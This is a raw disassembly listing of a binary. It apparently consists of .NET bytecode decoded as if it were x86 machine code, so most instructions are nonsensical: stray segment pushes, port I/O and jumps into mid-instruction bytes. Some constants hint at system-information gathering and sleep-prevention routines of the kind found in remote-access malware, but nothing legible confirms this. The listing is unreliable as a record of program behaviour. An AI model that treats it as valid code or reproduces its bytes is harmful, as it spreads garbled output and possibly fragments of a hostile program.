  4036a7:	00 00                	add    %al,(%eax)
  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 d2             	es jb  0x4036a4
  4036d2:	23 00                	and    (%eax),%eax
  4036d4:	70 0a                	jo     0x4036e0
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	e4 23                	in     $0x23,%al
  40372e:	00 70 28             	add    %dh,0x28(%eax)
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 4e 21 00       	and    $0x214e72,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 ea                	jb     0x403764
  40377a:	23 00                	and    (%eax),%eax
  40377c:	70 6f                	jo     0x4037ed
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 00 24 00       	and    $0x240072,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 0a 24 00       	and    $0x240a72,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 14 24 00       	and    $0x241472,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 1a                	jb     0x4037e7
  4037cd:	24 00                	and    $0x0,%al
  4037cf:	70 14                	jo     0x4037e5
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 2e             	or     0x2e(%edx),%dh
  4037d8:	24 00                	and    $0x0,%al
  4037da:	70 28                	jo     0x403804
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	32 24 00             	xor    (%eax,%eax,1),%ah
  4037ec:	70 72                	jo     0x403860
  4037ee:	3c 24                	cmp    $0x24,%al
  4037f0:	00 70 6f             	add    %dh,0x6f(%eax)
  4037f3:	95                   	xchg   %eax,%ebp
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 48             	or     0x48(%edx),%dh
  4037f9:	24 00                	and    $0x0,%al
  4037fb:	70 72                	jo     0x40386f
  4037fd:	54                   	push   %esp
  4037fe:	24 00                	and    $0x0,%al
  403800:	70 6f                	jo     0x403871
  403802:	95                   	xchg   %eax,%ebp
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 60 24 00       	and    $0x246072,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 6a 24 00       	and    $0x246a72,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 7a 24 00       	and    $0x247a72,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 86             	or     -0x7a(%edx),%dh
  403859:	24 00                	and    $0x0,%al
  40385b:	70 72                	jo     0x4038cf
  40385d:	7a 24                	jp     0x403883
  40385f:	00 70 6f             	add    %dh,0x6f(%eax)
  403862:	95                   	xchg   %eax,%ebp
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 90             	or     -0x70(%edx),%dh
  403868:	24 00                	and    $0x0,%al
  40386a:	70 72                	jo     0x4038de
  40386c:	0a 24 00             	or     (%eax,%eax,1),%ah
  40386f:	70 6f                	jo     0x4038e0
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 9c 24 00       	and    $0x249c72,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 b4 24 00       	and    $0x24b472,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 c6 24 00       	and    $0x24c672,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 da 24 00       	and    $0x24da72,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 ee 24 00       	and    $0x24ee72,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 48                	jb     0x40393d
  4038f5:	21 00                	and    %eax,(%eax)
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 f8 24 00       	and    $0x24f872,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 04             	adc    %esi,0x4(%edx)
  40399e:	25 00 70 28 8a       	and    $0x8a287000,%eax
  4039a3:	00 00                	add    %al,(%eax)
  4039a5:	0a 72 0a             	or     0xa(%edx),%dh
  4039a8:	25 00 70 28 68       	and    $0x68287000,%eax
  4039ad:	00 00                	add    %al,(%eax)
  4039af:	0a 72 36             	or     0x36(%edx),%dh
  4039b2:	25 00 70 73 a1       	and    $0xa1737000,%eax
  4039b7:	00 00                	add    %al,(%eax)
  4039b9:	0a 0a                	or     (%edx),%cl
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 74    	or     0x74720907,%cl
  4039dd:	25 00 70 6f 83       	and    $0x836f7000,%eax
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 8c                	jb     0x4039a2
  403a16:	25 00 70 13 04       	and    $0x4137000,%eax
  403a1b:	dd 31                	fnsave (%ecx)
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 72 94             	add    %dh,-0x6c(%edx)
  403a22:	25 00 70 07 6f       	and    $0x6f077000,%eax
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 8c                	jb     0x4039d3
  403a47:	25 00 70 13 04       	and    $0x4137000,%eax
  403a4c:	dd 00                	fldl   (%eax)
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	00 11                	add    %dl,(%ecx)
  403a52:	04 2a                	add    $0x2a,%al
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 48             	add    %dh,0x48(%edx)
  403b3e:	21 00                	and    %eax,(%eax)
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
  403c1b:	0b dd                	or     %ebp,%ebx
  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
